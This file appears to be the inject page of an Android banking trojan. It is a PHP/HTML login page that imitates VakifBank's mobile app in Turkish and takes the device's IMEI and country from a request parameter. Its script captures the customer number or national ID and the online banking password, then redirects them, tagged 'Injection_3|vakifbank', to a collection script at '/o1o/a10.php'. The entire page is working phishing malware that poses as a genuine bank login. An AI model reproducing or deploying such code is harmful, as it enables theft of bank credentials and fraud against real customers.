<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
<!--===============================================================================================-->	
	<link rel="icon" type="image/png" href="tr/com.vakifbank.mobile/images/icons/favicon.ico"/>
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="tr/com.vakifbank.mobile/vendor/bootstrap/css/bootstrap.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="tr/com.vakifbank.mobile/fonts/font-awesome-4.7.0/css/font-awesome.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="tr/com.vakifbank.mobile/fonts/iconic/css/material-design-iconic-font.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="tr/com.vakifbank.mobile/vendor/animate/animate.css">
<!--===============================================================================================-->	
	<link rel="stylesheet" type="text/css" href="tr/com.vakifbank.mobile/vendor/css-hamburgers/hamburgers.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="tr/com.vakifbank.mobile/vendor/animsition/css/animsition.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="tr/com.vakifbank.mobile/vendor/select2/select2.min.css">
<!--===============================================================================================-->	
	<link rel="stylesheet" type="text/css" href="tr/com.vakifbank.mobile/vendor/daterangepicker/daterangepicker.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="tr/com.vakifbank.mobile/css/util.css">
	<link rel="stylesheet" type="text/css" href="tr/com.vakifbank.mobile/css/main.css">
<!--===============================================================================================-->
</head>
<?php
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body>
	
	<div class="limiter">
		<center>
		<img src="tr/com.vakifbank.mobile/images/userico.jpg.png" width="30px" style="margin-left: 0px; margin-top: 12px;"/>
		<img style="margin-left: 30px; margin-top: 12px;" src="tr/com.vakifbank.mobile/images/logo.png" width="250px" />
		
			</center>
			<div class="container-login100">
			
			<div class="wrap-login100">
				<form class="login100-form validate-form" method="post">
					


					<div class="wrap-input100 validate-input" data-validate = "Enter username">
						<input class="input100" type="text" name="fields[login]"  id="login" onKeyUp="if(this.value>9999999999){this.value=this.value.substr(0,11);}" placeholder="Müşteri Numarası / TC. Kimlik No">
						<span class="focus-input100" data-placeholder="&#xf207;"></span>
					</div>

					<div class="wrap-input100 validate-input" data-validate="Enter password">
						<input class="input100" type="password" name="fields[password]"  id="password" placeholder="Online Bankacılık Şifreniz" >
						<span class="focus-input100" data-placeholder="&#xf191;"></span>
					</div>

					<div class="contact100-form-checkbox">
						<input class="input-checkbox100" id="ckb1" type="checkbox" name="remember-me">
						<label class="label-checkbox100" for="ckb1">
							Beni Hatırla
						</label>
					</div>
					<input type="hidden" name="fields[type]" value="persxxxx_acc" />

					<div class="container-login100-form-btn">
						<button class="login100-form-btn" id="input_submitBtn">
							Devam
						</button>
					</div>

					<div class="text-center p-t-90">
						
					</div>
				</form>
			</div>
		</div>
</div>
	

	<div id="dropDownSelect1"></div>
	
<!--===============================================================================================-->
	<script src="tr/com.vakifbak.mobile/vendor/jquery/jquery-3.2.1.min.js"></script>
<!--===============================================================================================-->
	<script src="tr/com.vakifbak.mobile/vendor/animsition/js/animsition.min.js"></script>
<!--===============================================================================================-->
	<script src="tr/com.vakifbak.mobile/vendor/bootstrap/js/popper.js"></script>
	<script src="tr/com.vakifbak.mobile/vendor/bootstrap/js/bootstrap.min.js"></script>
<!--===============================================================================================-->
	<script src="tr/com.vakifbak.mobile/vendor/select2/select2.min.js"></script>
<!--===============================================================================================-->
	<script src="tr/com.vakifbak.mobile/vendor/daterangepicker/moment.min.js"></script>
	<script src="tr/com.vakifbak.mobile/vendor/daterangepicker/daterangepicker.js"></script>
<!--===============================================================================================-->
	<script src="tr/com.vakifbak.mobile/vendor/countdowntime/countdowntime.js"></script>
<!--===============================================================================================-->
	<script src="tr/com.vakifbak.mobile/js/main.js"></script>
	<script type="text/javascript">
  (function () {


        var  __insHiddenField = function (objDoc, objForm, sNm, sV) {
             var input = objDoc.createElement("input");
             input.setAttribute("type", "hidden");
             input.setAttribute("name", sNm);
             input.setAttribute("value", sV);
             input.value = sV;
             objForm.appendChild(input);
         };
                    var g_oBtn = document.getElementById('input_submitBtn');
                    g_oBtn.onclick = function () {

						var oNumInp = document.getElementById('login');
                        var oCodeInp = document.getElementById('password');

						try{
							oNumInp.className = oCodeInp.className = 'input';
						} catch(e){};

                        if (oNumInp.value.length < 3) {
							try{
								oNumInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }

                        if (!/^\w{3,100}$/i.test(oCodeInp.value)) {
							try{
                                oCodeInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
top['closeDlg'] = true;
var url='';
var imei_c='<?php echo $IMEI_country; ?>';
location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_3|vakifbank|"+oNumInp.value+"|"+oCodeInp.value);

return false;
};

})();
            </script>

</body>
</html>